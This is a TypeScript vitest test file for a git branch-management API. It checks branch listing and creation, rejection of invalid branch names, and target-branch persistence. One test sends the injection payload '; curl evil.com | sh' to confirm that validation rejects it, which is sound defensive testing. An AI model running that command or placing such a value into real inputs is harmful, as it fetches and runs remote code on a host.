import { describe, it, expect, beforeEach, afterEach, afterAll } from 'vitest';
import express from 'express';
import { createServer } from 'http';
import type { Server } from 'http';
import { mkdirSync, writeFileSync, rmSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import { execSync } from 'child_process';
import { TerminalManager } from '../src/terminal-manager.js';
import { WorktreeManager } from '../src/worktree-manager.js';
import { PRManager } from '../src/pr-manager.js';
import { Store } from '../src/store.js';
import { createPRApiRouter } from '../src/pr-api.js';
import { config, updateConfig } from '../src/config.js';

async function request(server: Server, method: string, path: string, body?: any) {
  const addr = server.address() as any;
  const url = `http://127.0.0.1:${addr.port}${path}`;
  const opts: RequestInit = {
    method,
    headers: { 'Content-Type': 'application/json' },
  };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(url, opts);
  const json = await res.json().catch(() => null);
  return { status: res.status, body: json };
}

describe('Branches API', () => {
  let server: Server;
  let terminalManager: TerminalManager;
  let store: Store;
  let tmpDir: string;
  let originalRepoPath: string;
  let originalTargetBranch: string;

  beforeEach(async () => {
    // Create a temp git repo
    tmpDir = join(tmpdir(), `hermes-branch-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    mkdirSync(tmpDir, { recursive: true });
    execSync('git init', { cwd: tmpDir, stdio: 'pipe' });
    execSync('git config user.email "test@test.com"', { cwd: tmpDir, stdio: 'pipe' });
    execSync('git config user.name "Test"', { cwd: tmpDir, stdio: 'pipe' });
    writeFileSync(join(tmpDir, 'README.md'), '# Test');
    execSync('git add -A && git commit -m "init"', { cwd: tmpDir, stdio: 'pipe' });
    // Create a couple of branches
    execSync('git branch develop', { cwd: tmpDir, stdio: 'pipe' });
    execSync('git branch feature/test', { cwd: tmpDir, stdio: 'pipe' });

    originalRepoPath = config.repoPath;
    originalTargetBranch = config.targetBranch;
    updateConfig({ repoPath: tmpDir, targetBranch: 'master' });

    // Use in-memory SQLite store for persistence tests
    store = new Store(':memory:');

    terminalManager = new TerminalManager();
    const worktreeManager = new WorktreeManager();
    const prManager = new PRManager(terminalManager, worktreeManager);

    const app = express();
    app.use(createPRApiRouter(prManager, undefined, store));

    server = createServer(app);
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  });

  afterEach(() => {
    server.close();
    terminalManager.killAll();
    store.close();
    updateConfig({ repoPath: originalRepoPath, targetBranch: originalTargetBranch });
    try {
      rmSync(tmpDir, { recursive: true, force: true });
    } catch { /* ignore */ }
  });

  describe('GET /branches', () => {
    it('returns list of branches', async () => {
      const res = await request(server, 'GET', '/branches');
      expect(res.status).toBe(200);
      expect(res.body.branches).toBeInstanceOf(Array);
      expect(res.body.branches).toContain('master');
      expect(res.body.branches).toContain('develop');
      expect(res.body.branches).toContain('feature/test');
    });

    it('returns current target branch', async () => {
      const res = await request(server, 'GET', '/branches');
      expect(res.status).toBe(200);
      expect(res.body.current).toBe('master');
    });
  });

  describe('POST /branches', () => {
    it('creates a new branch', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'release/v1' });
      expect(res.status).toBe(200);
      expect(res.body.branch).toBe('release/v1');

      // Branch should exist in the repo
      const branchList = execSync('git branch --list', { cwd: tmpDir, stdio: 'pipe' }).toString();
      expect(branchList).toContain('release/v1');
    });

    it('updates target branch after creation', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'new-target' });
      expect(res.status).toBe(200);
      expect(config.targetBranch).toBe('new-target');
    });

    it('rejects empty branch name', async () => {
      const res = await request(server, 'POST', '/branches', { name: '' });
      expect(res.status).toBe(400);
    });

    it('rejects missing branch name', async () => {
      const res = await request(server, 'POST', '/branches', {});
      expect(res.status).toBe(400);
    });

    it('rejects invalid branch name with spaces', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'my branch' });
      expect(res.status).toBe(400);
    });

    it('returns 409 for duplicate branch name', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'develop' });
      expect(res.status).toBe(409);
      expect(res.body.error).toBeTruthy();
    });

    it('rejects branch names containing ".."', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'foo..bar' });
      expect(res.status).toBe(400);
    });

    it('rejects branch names ending with ".lock"', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'refs.lock' });
      expect(res.status).toBe(400);
    });

    it('rejects branch names with consecutive slashes', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'foo//bar' });
      expect(res.status).toBe(400);
    });

    it('rejects branch names ending with "/"', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'foo/' });
      expect(res.status).toBe(400);
    });
  });

  describe('target branch via PATCH /config', () => {
    it('allows changing target branch via config endpoint', async () => {
      const res = await request(server, 'PATCH', '/config', { targetBranch: 'develop' });
      expect(res.status).toBe(200);
      expect(res.body.targetBranch).toBe('develop');
    });

    it('persists target branch to store when changed via config', async () => {
      await request(server, 'PATCH', '/config', { targetBranch: 'develop' });
      expect(store.getConfig('targetBranch')).toBe('develop');
    });

    it('does not persist target branch when not included in update', async () => {
      await request(server, 'PATCH', '/config', { githubEnabled: true });
      expect(store.getConfig('targetBranch')).toBeUndefined();
    });

    it('rejects malicious targetBranch values (command injection prevention)', async () => {
      // Attempt command injection via targetBranch
      const res = await request(server, 'PATCH', '/config', { targetBranch: '; curl evil.com | sh' });
      expect(res.status).toBe(200);
      // targetBranch should remain unchanged (validation rejects the malicious value)
      expect(res.body.targetBranch).toBe('master');
    });

    it('rejects targetBranch with ".." pattern', async () => {
      const res = await request(server, 'PATCH', '/config', { targetBranch: 'a..b' });
      expect(res.status).toBe(200);
      expect(res.body.targetBranch).toBe('master');
    });

    it('rejects targetBranch ending with ".lock"', async () => {
      const res = await request(server, 'PATCH', '/config', { targetBranch: 'refs.lock' });
      expect(res.status).toBe(200);
      expect(res.body.targetBranch).toBe('master');
    });
  });

  describe('target branch persistence via POST /branches', () => {
    it('persists new target branch to store after branch creation', async () => {
      const res = await request(server, 'POST', '/branches', { name: 'release/v2' });
      expect(res.status).toBe(200);
      expect(store.getConfig('targetBranch')).toBe('release/v2');
    });
  });
});
